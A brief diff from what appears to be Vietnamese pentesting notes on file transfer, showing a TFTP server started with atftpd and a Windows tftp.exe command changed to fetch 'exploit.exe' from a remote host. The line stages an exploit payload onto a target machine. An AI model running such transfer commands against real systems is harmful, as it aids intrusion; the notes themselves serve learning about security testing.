@@ -40,7 +40,7 @@ server: atftpd --daemon --port 69 /var/www/html
 
 Trên máy Windows 7 download phần mềm tftp về ở link sau: https://www.tftp-server.com/tftp-download.html
 
-client: tftp.exe -i 192.169.27.160 get exploit.php
+client: tftp.exe -i 192.169.27.160 get exploit.exe
 
 >Powershell
 
